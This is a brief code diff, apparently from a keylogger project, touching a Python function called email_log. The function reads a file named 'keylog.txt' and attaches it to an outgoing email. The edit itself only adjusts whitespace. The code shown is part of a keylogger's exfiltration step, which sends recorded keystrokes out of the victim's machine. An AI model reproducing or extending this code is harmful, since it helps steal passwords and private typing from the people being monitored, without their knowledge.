@@ -34,7 +34,7 @@ def email_log():
     
     file = "keylog.txt"
     with open(file, "r") as f:
-        attachment = MIMEApplication(f.read(),Name = basename(file))
+        attachment = MIMEApplication(f.read(), Name = basename(file))
         attachment["Content-Disposition"] = "attachment"; file = "{}".format(basename(file))
     msg.attach(attachment)
     
